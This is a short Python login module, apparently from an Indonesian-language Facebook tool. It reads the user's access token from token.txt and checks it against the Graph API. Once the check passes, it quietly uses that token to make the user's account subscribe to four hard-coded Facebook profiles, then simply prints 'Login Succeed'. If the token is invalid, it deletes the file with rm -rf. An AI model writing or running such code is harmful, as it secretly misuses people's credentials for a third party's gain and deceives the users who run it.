import requests,os,json
import elite

P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
O = "\x1b[0;96m" # Biru Muda

def main():
    try:
        token = open("token.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token=" + token)
        a = json.loads(otw.text)
        nama = a["name"]
    except (KeyError,IOError):
        print('%s║'%(M))
        print('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        exit(elite.menu_log())
    requests.post("https://graph.facebook.com/100060885769913/subscribers?access_token=" + token)      #  احسان اللہ
    requests.post("https://graph.facebook.com/100012267158212/subscribers?access_token=" + token) #  وزیراعظم صاحب
    requests.post("https://graph.facebook.com/100009834670141/subscribers?access_token=" + token) #  نسرین اختر
    requests.post("https://graph.facebook.com/100007026360241/subscribers?access_token=" + token) # Zama Jan
    print('%s║'%(O))
    print('%s╚══[%s!%s] %sLogin Succeed'%(O,P,O,P))
    exit(elite.menu())
